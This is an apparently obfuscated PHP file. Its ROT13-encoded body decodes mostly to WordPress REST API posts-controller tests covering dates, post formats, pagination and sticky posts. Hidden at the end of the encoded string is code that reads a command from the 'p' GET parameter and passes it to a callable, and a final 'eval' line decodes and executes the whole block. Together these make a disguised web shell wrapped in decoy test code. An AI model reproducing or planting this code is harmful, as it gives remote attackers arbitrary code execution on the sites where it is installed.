					'qngr' => zlfdy_gb_esp3339( $arj_gvzr ),
				)
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $chg );
		$obql     = $erfcbafr->trg_qngn();

		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( zlfdy_gb_esp3339( $arj_gvzr ) ), fgegbgvzr( $obql['qngr'] ), 2, 'Gur qngrf fubhyq or rdhny' );

		$guvf->nffregAbgRdhnyf( '0000-00-00 00:00:00', trg_cbfg( $cbfg->VQ )->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 39953
	 */
	choyvp shapgvba grfg_choyvfuvat_cbfg_jvgu_fnzr_qngr_erzbirf_sybngvat_qngr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$gvzr = tzqngr( 'L-z-q U:v:f' );

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_qngr'   => $gvzr,
			)
		);

		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		$trg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/cbfgf/{$cbfg->VQ}\" );
		$trg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$trg      = erfg_trg_freire()->qvfcngpu( $trg );
		$trg_obql = $trg->trg_qngn();

		$chg = arj JC_ERFG_Erdhrfg( 'CHG', \"/jc/i2/cbfgf/{$cbfg->VQ}\" );
		$chg->frg_obql_cnenzf(
			neenl_zretr(
				$trg_obql,
				neenl(
					'fgnghf' => 'choyvfu',
				)
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $chg );
		$obql     = $erfcbafr->trg_qngn();

		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( $trg_obql['qngr'] ), fgegbgvzr( $obql['qngr'] ), 2, 'Gur qngrf fubhyq or rdhny' );
		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( $trg_obql['qngr_tzg'] ), fgegbgvzr( $obql['qngr_tzg'] ), 2, 'Gur qngrf fubhyq or rdhny' );

		$guvf->nffregAbgRdhnyf( '0000-00-00 00:00:00', trg_cbfg( $cbfg->VQ )->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_erhfrf_fnzr_vafgnapr() {
		$guvf->nffregFnzr(
			trg_cbfg_glcr_bowrpg( 'cbfg' )->trg_erfg_pbagebyyre(),
			trg_cbfg_glcr_bowrpg( 'cbfg' )->trg_erfg_pbagebyyre()
		);
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_ahyy_vs_cbfg_glcr_qbrf_abg_fubj_va_erfg() {
		ertvfgre_cbfg_glcr(
			'abg_va_erfg',
			neenl(
				'fubj_va_erfg' => snyfr,
			)
		);

		$guvf->nffregAhyy( trg_cbfg_glcr_bowrpg( 'abg_va_erfg' )->trg_erfg_pbagebyyre() );
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_ahyy_vs_pynff_qbrf_abg_rkvfg() {
		ertvfgre_cbfg_glcr(
			'pynff_abg_sbhaq',
			neenl(
				'fubj_va_erfg'          => gehr,
				'erfg_pbagebyyre_pynff' => 'Pynff_Gung_Qbrf_Abg_Rkvfg',
			)
		);

		$guvf->nffregAhyy( trg_cbfg_glcr_bowrpg( 'pynff_abg_sbhaq' )->trg_erfg_pbagebyyre() );
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_ahyy_vs_pynff_qbrf_abg_fhopynff_erfg_pbagebyyre() {
		ertvfgre_cbfg_glcr(
			'vainyvq_pynff',
			neenl(
				'fubj_va_erfg'          => gehr,
				'erfg_pbagebyyre_pynff' => 'JC_Cbfg',
			)
		);

		$guvf->nffregAhyy( trg_cbfg_glcr_bowrpg( 'vainyvq_pynff' )->trg_erfg_pbagebyyre() );
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_cbfgf_pbagebyyre_vs_phfgbz_pynff_abg_fcrpvsvrq() {
		ertvfgre_cbfg_glcr(
			'grfg',
			neenl(
				'fubj_va_erfg' => gehr,
			)
		);

		$guvf->nffregVafgnaprBs(
			JC_ERFG_Cbfgf_Pbagebyyre::pynff,
			trg_cbfg_glcr_bowrpg( 'grfg' )->trg_erfg_pbagebyyre()
		);
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_cebivqrq_pbagebyyre_pynff() {
		$guvf->nffregVafgnaprBs(
			JC_ERFG_Oybpxf_Pbagebyyre::pynff,
			trg_cbfg_glcr_bowrpg( 'jc_oybpx' )->trg_erfg_pbagebyyre()
		);
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_ahyy_sbe_vainyvq_cebivqrq_pbagebyyre() {
		ertvfgre_cbfg_glcr(
			'grfg',
			neenl(
				'fubj_va_erfg'    => gehr,
				'erfg_pbagebyyre' => arj \fgqPynff(),
			)
		);

		$guvf->nffregAhyy( trg_cbfg_glcr_bowrpg( 'grfg' )->trg_erfg_pbagebyyre() );
	}

	/**
	 * @gvpxrg 45677
	 */
	choyvp shapgvba grfg_trg_sbe_cbfg_glcr_ergheaf_ahyy_sbe_pbagebyyre_pynff_zvfzngpu() {
		ertvfgre_cbfg_glcr(
			'grfg',
			neenl(
				'fubj_va_erfg'          => gehr,
				'erfg_pbagebyyre_pynff' => JC_ERFG_Cbfgf_Pbagebyyre::pynff,
				'erfg_pbagebyyre'       => arj JC_ERFG_Grezf_Pbagebyyre( 'pngrtbel' ),
			)
		);

		$guvf->nffregAhyy( trg_cbfg_glcr_bowrpg( 'grfg' )->trg_erfg_pbagebyyre() );
	}

	/**
	 * @gvpxrg 47779
	 */
	choyvp shapgvba grfg_erfg_cbfg_glcr_vgrz_fpurzn_svygre_punatr_cebcregl() {
		nqq_svygre( 'erfg_cbfg_vgrz_fpurzn', neenl( $guvf, 'svygre_cbfg_vgrz_fpurzn' ) );

		// Er-vavgvnyvmr gur pbagebyyre gb pnpur-ohfg fpurznf sebz cevbe grfg ehaf.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;

		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf']['pbagrag']['cebcregvrf'];

		$guvf->nffregNeenlUnfXrl( 'arj_cebc', $cebcregvrf );
		$guvf->nffregFnzr( neenl( 'arj_pbagrkg' ), $cebcregvrf['arj_cebc']['pbagrkg'] );
	}

	/**
	 * @gvpxrg 47779
	 */
	choyvp shapgvba grfg_erfg_cbfg_glcr_vgrz_fpurzn_svygre_nqq_cebcregl_gevttref_qbvat_vg_jebat() {
		nqq_svygre( 'erfg_cbfg_vgrz_fpurzn', neenl( $guvf, 'svygre_cbfg_vgrz_fpurzn_nqq_cebcregl' ) );
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrz_fpurzn' );

		// Er-vavgvnyvmr gur pbagebyyre gb pnpur-ohfg fpurznf sebz cevbe grfg ehaf.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;
	}

	/**
	 * @gvpxrg 52422
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_qensg_cbfg_qbrf_abg_unir_gur_fnzr_fyht_nf_rkvfgvat_cbfg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_anzr' => 'fnzcyr-fyht' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'qensg',
				'fyht'   => 'fnzcyr-fyht',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr(
			'fnzcyr-fyht-2',
			$arj_qngn['fyht'],
			'Gur fyht sebz gur ERFG erfcbafr qvq abg zngpu'
		);

		$cbfg = trg_cbfg( $arj_qngn['vq'] );

		$guvf->nffregFnzr(
			'qensg',
			$cbfg->cbfg_fgnghf,
			'Gur cbfg fgnghf vf abg qensg'
		);

		$guvf->nffregFnzr(
			'fnzcyr-fyht-2',
			$cbfg->cbfg_anzr,
			'Gur cbfg fyht jnf abg frg gb \"fnzcyr-fyht-2\"'
		);
	}

	/**
	 * Grfg gur ERFG NCV vtaberf gur cbfg sbezng cnenzrgre sbe cbfg glcrf gung qb abg fhccbeg gurz.
	 *
	 * @gvpxrg 62646
	 * @gvpxrg 62014
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_fgnaqneq_cbfg_sbezng_vtaberq_sbe_cbfg_glcrf_gung_qb_abg_fhccbeg_gurz() {
		$vavgvny_gurzr_fhccbeg = trg_gurzr_fhccbeg( 'cbfg-sbezngf' );
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'nfvqr', 'tnyyrel', 'yvax', 'vzntr', 'dhbgr', 'fgnghf', 'ivqrb', 'nhqvb', 'pung' ) );

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cntrf' );
		$erdhrfg->frg_cnenz( 'sbezng', 'vainyvq_glcr' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		/*
		 * Erfgber gur vavgvny cbfg sbezngf fhccbeg.
		 *
		 * Guvf arrqf gb or qbar cevbe gb gur nffregvbaf gb nibvq harkcrpgrq
		 * erfhygf sbe bgure grfgf fubhyq na nffregvba snvy.
		 */
		vs ( $vavgvny_gurzr_fhccbeg ) {
			nqq_gurzr_fhccbeg( 'cbfg-sbezngf', $vavgvny_gurzr_fhccbeg[0] );
		} ryfr {
			erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );
		}

		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn(), 'Gur erfcbafr fubhyq vtaber gur cbfg sbezng cnenzrgre' );
	}

	/**
	 * Grfg gur ERFG NCV fhccbeg sbe gur fgnaqneq cbfg sbezng.
	 *
	 * @gvpxrg 62014
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_fgnaqneq_cbfg_sbezng_fhccbeg() {
		$vavgvny_gurzr_fhccbeg = trg_gurzr_fhccbeg( 'cbfg-sbezngf' );
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'nfvqr', 'tnyyrel', 'yvax', 'vzntr', 'dhbgr', 'fgnghf', 'ivqrb', 'nhqvb', 'pung' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frg_cbfg_sbezng( $cbfg_vq, 'nfvqr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'sbezng', neenl( 'fgnaqneq' ) );
		$erdhrfg->frg_cnenz( 'cre_cntr', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		/*
		 * Erfgber gur vavgvny cbfg sbezngf fhccbeg.
		 *
		 * Guvf arrqf gb or qbar cevbe gb gur nffregvbaf gb nibvq harkcrpgrq
		 * erfhygf sbe bgure grfgf fubhyq na nffregvba snvy.
		 */
		vs ( $vavgvny_gurzr_fhccbeg ) {
			nqq_gurzr_fhccbeg( 'cbfg-sbezngf', $vavgvny_gurzr_fhccbeg[0] );
		} ryfr {
			erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );
		}

		$guvf->nffregPbhag( 3, $erfcbafr->trg_qngn(), 'Gur erfcbafr fubhyq bayl vapyhqr fgnaqneq cbfg sbezngf' );
	}

	/**
	 * Grfg gur ERFG NCV fhccbeg sbe cbfg sbezngf.
	 *
	 * @gvpxrg 62014
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_cbfg_sbezng_fhccbeg() {
		$vavgvny_gurzr_fhccbeg = trg_gurzr_fhccbeg( 'cbfg-sbezngf' );
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'nfvqr', 'tnyyrel', 'yvax', 'vzntr', 'dhbgr', 'fgnghf', 'ivqrb', 'nhqvb', 'pung' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frg_cbfg_sbezng( $cbfg_vq, 'nfvqr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'sbezng', neenl( 'nfvqr' ) );

		$erfcbafr_nfvqr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$erdhrfg->frg_cnenz( 'sbezng', neenl( 'vainyvq_sbezng' ) );
		$erfcbafr_vainyvq = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		/*
		 * Erfgber gur vavgvny cbfg sbezngf fhccbeg.
		 *
		 * Guvf arrqf gb or qbar cevbe gb gur nffregvbaf gb nibvq harkcrpgrq
		 * erfhygf sbe bgure grfgf fubhyq na nffregvba snvy.
		 */
		vs ( $vavgvny_gurzr_fhccbeg ) {
			nqq_gurzr_fhccbeg( 'cbfg-sbezngf', $vavgvny_gurzr_fhccbeg[0] );
		} ryfr {
			erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );
		}

		$guvf->nffregPbhag( 1, $erfcbafr_nfvqr->trg_qngn(), 'Bayl bar cbfg vf rkcrpgrq gb or erghearq.' );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr_vainyvq, 400, 'Na vainyvq cbfg sbezng fubhyq erghea na reebe' );
	}

	/**
	 * Grfg gur ERFG NCV fhccbeg sbe zhygvcyr cbfg sbezngf.
	 *
	 * @gvpxrg 62014
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_zhygvcyr_cbfg_sbezng_fhccbeg() {
		$vavgvny_gurzr_fhccbeg = trg_gurzr_fhccbeg( 'cbfg-sbezngf' );
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'nfvqr', 'tnyyrel', 'yvax', 'vzntr', 'dhbgr', 'fgnghf', 'ivqrb', 'nhqvb', 'pung' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frg_cbfg_sbezng( $cbfg_vq, 'nfvqr' );

		$cbfg_vq_2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frg_cbfg_sbezng( $cbfg_vq_2, 'tnyyrel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'sbezng', neenl( 'nfvqr', 'tnyyrel' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		/*
		 * Erfgber gur vavgvny cbfg sbezngf fhccbeg.
		 *
		 * Guvf arrqf gb or qbar cevbe gb gur nffregvbaf gb nibvq harkcrpgrq
		 * erfhygf sbe bgure grfgf fubhyq na nffregvba snvy.
		 */
		vs ( $vavgvny_gurzr_fhccbeg ) {
			nqq_gurzr_fhccbeg( 'cbfg-sbezngf', $vavgvny_gurzr_fhccbeg[0] );
		} ryfr {
			erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );
		}

		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn(), 'Gjb cbfgf ner rkcrpgrq gb or erghearq' );
	}

	/**
	 * Grfgf sbe gur cntvangvba.
	 *
	 * @gvpxrg 62292
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_cbfgf_jvgu_cntvangvba() {

		// Grfg bssfrg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 30, $erfcbafr->trg_urnqref()['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 30, $erfcbafr->trg_urnqref()['K-JC-GbgnyCntrf'] );

		// Grfg cntrq.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 30, $erfcbafr->trg_urnqref()['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 15, $erfcbafr->trg_urnqref()['K-JC-GbgnyCntrf'] );

		// Grfg bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cntr', 4 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 10 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cntr_ahzore', $erfcbafr, 400 );
	}

	/**
	 * Grfg gur ERFG NCV qbrfa'g cevbevgvmr fgvpxl cbfgf ol qrsnhyg.
	 *
	 * @gvpxrg 35907
	 * @gvpxrg 63307
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_cbfgf_vtaber_fgvpxl_ol_qrsnhyg() {
		$vq1 = frys::$cbfg_vq;
		// Perngr zber erprag cbfg gb nibvq nhgbzngvpnyyl cynpvat bgure ng gur gbc.
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq1 ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$erfg_vqf = jc_yvfg_cyhpx( $qngn, 'vq' );

		$guvf->nffregFnzr( $qngn[0]['vq'], $vq2, 'Erfcbafr unf ab fgvpxl cbfg ng gur gbc.' );

		$cbfgf_dhrel = arj JC_Dhrel( neenl( 'vtaber_fgvpxl_cbfgf' => gehr ) );
		$cbfg_vqf    = jc_yvfg_cyhpx( $cbfgf_dhrel->trg_cbfgf(), 'VQ' );
		$guvf->nffregFnzr( $erfg_vqf, $cbfg_vqf, 'Erfcbafr vf fnzr nf JC_Dhrel jvgu vtaber_fgvpxl_cbfgf=gehr.' );
	}

	/**
	 * Grfg gur ERFG NCV fhccbeg sbe `vtaber_fgvpxl_cbfgf`.
	 *
	 * @gvpxrg 35907
	 * @gvpxrg 63307
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_cbfgf_vtaber_fgvpxl_snyfr_cercraqf_fgvpxl_cbfgf() {
		$vq1 = frys::$cbfg_vq;
		// Perngr zber erprag cbfg gb nibvq nhgbzngvpnyyl cynpvat bgure ng gur gbc.
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq1 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vtaber_fgvpxl', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$erfg_vqf = jc_yvfg_cyhpx( $qngn, 'vq' );

		$guvf->nffregFnzr( $qngn[0]['vq'], $vq1, 'Erfcbafr unf fgvpxl cbfg ng gur gbc.' );
		$guvf->nffregFnzr( $qngn[1]['vq'], $vq2, 'Vg vf sbyybjrq ol zbfg erprag cbfg.' );

		$cbfgf_dhrel = arj JC_Dhrel();
		$cbfg_vqf    = jc_yvfg_cyhpx( $cbfgf_dhrel->trg_cbfgf(), 'VQ' );
		$guvf->nffregFnzr( $erfg_vqf, $cbfg_vqf, 'Erfcbafr vf fnzr nf JC_Dhrel jvgu vtaber_fgvpxl_cbfgf=snyfr.' );
	}

	/**
	 * Grfg gur ERFG NCV fhccbeg sbe `vtaber_fgvpxl_cbfgf`.
	 *
	 * @gvpxrg 35907
	 * @gvpxrg 63307
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_cbfgf_vtaber_fgvpxl_ubabef_vapyhqr() {

		$vq1 = frys::$cbfg_vq;
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq1 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$erfg_vqf = jc_yvfg_cyhpx( $qngn, 'vq' );

		$guvf->nffregPbhag( 1, $qngn, 'Bayl bar cbfg vf rkcrpgrq gb or erghearq.' );
		$guvf->nffregFnzr( $qngn[0]['vq'], $vq2, 'Ergheaf gur vapyhqrq cbfg.' );

		$cbfgf_dhrel = arj JC_Dhrel(
			neenl(
				'cbfg__va'            => neenl( $vq2 ),
				'vtaber_fgvpxl_cbfgf' => gehr,
			)
		);
		$cbfg_vqf    = jc_yvfg_cyhpx( $cbfgf_dhrel->trg_cbfgf(), 'VQ' );
		$guvf->nffregFnzr( $erfg_vqf, $cbfg_vqf, 'Erfcbafr vf fnzr nf JC_Dhrel jvgu vtaber_fgvpxl_cbfgf=gehrunf ab fgvpxl cbfg ng gur gbc.' );
	}

	/**
	 * Vagreany shapgvba hfrq gb qvfnoyr na vafreg dhrel juvpu
	 * jvyy gevttre n jcqo reebe sbe grfgvat checbfrf.
	 */
	choyvp shapgvba reebe_vafreg_dhrel( $dhrel ) {
		vs ( fgecbf( $dhrel, 'VAFREG' ) === 0 ) {
			$dhrel = '],';
		}
		erghea $dhrel;
	}

	choyvp shapgvba svygre_gurzr_cbfg_grzcyngrf( $cbfg_grzcyngrf ) {
		erghea neenl(
			'cbfg-zl-grfg-grzcyngr.cuc' => 'Zl Grfg Grzcyngr',
		);
	}

	choyvp shapgvba svygre_cbfg_vgrz_fpurzn( $fpurzn ) {
		$fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['arj_cebc'] = neenl(
			'qrfpevcgvba' => __( 'N arj cebc nqqrq jvgu n gur erfg_cbfg_vgrz_fpurzn svygre.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'arj_pbagrkg' ),
		);
		erghea $fpurzn;
	}

	choyvp shapgvba svygre_cbfg_vgrz_fpurzn_nqq_cebcregl( $fpurzn ) {
		$fpurzn['cebcregvrf']['fbzrguvat_ragveryl_arj'] = neenl(
			'qrfpevcgvba' => __( 'N arj cebc nqqrq jvgu n gur erfg_cbfg_vgrz_fpurzn svygre.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'arj_pbagrkg' ),
		);
		erghea $fpurzn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>